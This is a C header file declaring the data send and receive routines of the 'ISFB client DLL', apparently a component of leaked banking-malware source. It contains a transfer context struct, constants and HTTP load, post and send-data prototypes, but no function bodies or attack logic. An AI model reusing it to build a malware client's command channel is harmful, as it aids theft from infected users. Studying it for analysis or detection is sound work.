//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: transfer.h
// $Revision: 225 $
// $Date: 2014-04-04 15:56:47 +0400 (Пт, 04 апр 2014) $
// description:
//	ISFB client DLL. Data send and receive routines.


typedef	struct _TRANSFER_CONTEXT
{
#ifdef _DEBUG
	ULONG	Magic;
#endif
	PCHAR	Buffer;			// Received data buffer

	PCHAR	Headers;		// HTTP headers buffer
	PCHAR	HttpStatus;		// HTTP status string

	HANDLE	hInternet;
	HANDLE	hConnection;
	HANDLE	hRequest;

	HANDLE	hEvent;
	HANDLE	hSentEvent;

	ULONG	Status;			// WINERROR operation status
	ULONG	Length;			// size of the received data buffer in bytes
	ULONG	Flags;			

	CHAR	Url[0];
} TRANSFER_CONTEXT, *PTRANSFER_CONTEXT;

#define		TCF_RELEASE_ON_COMPLETE		1

#define		TRANSFER_CONNECT_TIMEOUT	30*1000	// milliseconds
#define		TRANSFER_MAX_BUFFER			0x1000	// bytes


#define		TRANSFER_CONTEXT_MAGIC		'xtCT'
#define		ASSERT_TRANSFER_CONTEXT(x)	ASSERT(x->Magic == TRANSFER_CONTEXT_MAGIC)


PTRANSFER_CONTEXT	TransferAllocateContextForUrl(PCHAR Url);

BOOL	TransferInitContext(PTRANSFER_CONTEXT Ctx);
VOID	TransferReleaseContext(PTRANSFER_CONTEXT Ctx);

WINERROR TransferLoadPage(PCHAR Url, PCHAR UserAgent, PCHAR* pData, PULONG pSize);
WINERROR TransferLoadPageEx(PCHAR Url, PCHAR UserAgent, BOOL bPost, PCHAR pSendData, ULONG SendSize, PCHAR* pData, PULONG pSize);
WINERROR TransferSendData(LPTSTR pUrl, LPVOID Data, ULONG Size, LPTSTR UserAgent, LPTSTR FileName, BOOL bWait);

WINERROR TransferInitializeReceive(PTRANSFER_CONTEXT Ctx, PCHAR pUrl, PCHAR pUserAgent, PCHAR pRequestData, ULONG RequestSize, BOOL bPost);
WINERROR TransferCompleteReceive(PTRANSFER_CONTEXT Ctx, BOOL bHeaders);
LPSTR TaransferGetRequestHeaders(HINTERNET hRequest);

